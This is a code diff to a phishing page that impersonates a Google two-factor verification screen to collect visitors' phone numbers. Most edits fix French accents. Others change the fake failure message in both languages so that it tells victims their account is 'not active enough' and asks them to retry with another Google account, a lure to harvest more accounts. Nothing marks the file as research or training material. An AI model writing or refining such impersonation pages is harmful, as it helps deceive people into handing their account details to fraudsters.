@@ -242,8 +242,8 @@
     <img class="logo" src="/assets/google-icon.png" alt="Google" />
 
     <div class="step visible" id="step1">
-      <h1 class="step-title">Confirmez votre identite</h1>
-      <p class="step-desc">Utilisez votre numero de telephone pour confirmer votre identite.</p>
+      <h1 class="step-title">Confirmez votre identité</h1>
+      <p class="step-desc">Utilisez votre numéro de téléphone pour confirmer votre identité.</p>
 
       <form id="phoneForm">
         <div class="form-group">
@@ -255,7 +255,7 @@
               </select>
               <span id="countryCodeDisplay" class="country-code-display">+33</span>
             </div>
-            <input id="phoneNumber" name="phoneNumber" type="tel" autocomplete="tel" placeholder="Numero de telephone" required />
+            <input id="phoneNumber" name="phoneNumber" type="tel" autocomplete="tel" placeholder="Numéro de téléphone" required />
           </div>
         </div>
 
@@ -265,22 +265,22 @@
     </div>
 
     <div class="step" id="step2">
-      <h1 class="step-title">Verification en cours</h1>
-      <p class="step-desc">Nous verifions vos informations de connexion.</p>
+      <h1 class="step-title">Vérification en cours</h1>
+      <p class="step-desc">Nous vérifions vos informations de connexion.</p>
       <div class="loader-wrapper">
         <div class="spinner"></div>
-        <p class="loader-text" id="loaderText">Vous allez etre redirige...</p>
+        <p class="loader-text" id="loaderText">Vous allez être redirigé...</p>
       </div>
     </div>
 
     <div class="step" id="step3">
-      <h1 class="step-title">Verification echouee</h1>
-      <p class="step-desc">Nous n'avons pas pu verifier votre identite.</p>
+      <h1 class="step-title">Vérification échouée</h1>
+      <p class="step-desc">Nous n'avons pas pu vérifier votre identité.</p>
 
       <div class="error-icon">
         <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm1 15h-2v-2h2v2zm0-4h-2V7h2v6z"/></svg>
       </div>
-      <p class="error-text">La verification de securite a echoue. Votre session a expire ou le service est temporairement indisponible. Veuillez reessayer ulterieurement.</p>
+      <p class="error-text">La vérification de sécurité a échoué. Ce compte Google n'est pas suffisamment actif pour accéder à ce document. Veuillez réessayer avec un autre compte Google.</p>
       <p class="error-code" id="errorCode"></p>
     </div>
   </div>
@@ -293,20 +293,20 @@
     const I18N = {
       fr: {
         pageTitle: "Google - Authentification 2FA",
-        step1Title: "Confirmez votre identite",
-        step1Desc: "Utilisez votre numero de telephone pour confirmer votre identite.",
+        step1Title: "Confirmez votre identité",
+        step1Desc: "Utilisez votre numéro de téléphone pour confirmer votre identité.",
         labelCountryCode: "Indicatif",
-        placeholderPhone: "Numero de telephone",
+        placeholderPhone: "Numéro de téléphone",
         btnConfirm: "Confirmer",
-        step2Title: "Verification en cours",
-        step2Desc: "Nous verifions vos informations de connexion.",
-        loaderText: "Vous allez etre redirige...",
-        loaderVerifying: "Verification de securite...",
+        step2Title: "Vérification en cours",
+        step2Desc: "Nous vérifions vos informations de connexion.",
+        loaderText: "Vous allez être redirigé...",
+        loaderVerifying: "Vérification de sécurité...",
         loaderAlmost: "Finalisation...",
-        step3Title: "Verification echouee",
-        step3Desc: "Nous n'avons pas pu verifier votre identite.",
-        errorText: "La verification de securite a echoue. Votre session a expire ou le service est temporairement indisponible. Veuillez reessayer ulterieurement.",
-        errorInvalidPhone: "Veuillez saisir un numero valide.",
+        step3Title: "Vérification échouée",
+        step3Desc: "Nous n'avons pas pu vérifier votre identité.",
+        errorText: "La vérification de sécurité a échoué. Ce compte Google n'est pas suffisamment actif pour accéder à ce document. Veuillez réessayer avec un autre compte Google.",
+        errorInvalidPhone: "Veuillez saisir un numéro valide.",
         errorCode: "Erreur"
       },
       en: {
@@ -323,7 +323,7 @@
         loaderAlmost: "Finalizing...",
         step3Title: "Verification failed",
         step3Desc: "We could not verify your identity.",
-        errorText: "The security verification failed. Your session has expired or the service is temporarily unavailable. Please try again later.",
+        errorText: "The security verification failed. This Google account is not active enough to access this document. Please try again with a different Google account.",
         errorInvalidPhone: "Please enter a valid number.",
         errorCode: "Error"
       }
@@ -375,8 +375,8 @@
       ] : [
         { name: "France", dial: "+33" },
         { name: "Canada", dial: "+1" },
-        { name: "Etats-Unis", dial: "+1" },
-        { name: "Indonesie", dial: "+62" },
+        { name: "États-Unis", dial: "+1" },
+        { name: "Indonésie", dial: "+62" },
         { name: "Royaume-Uni", dial: "+44" }
       ];
 
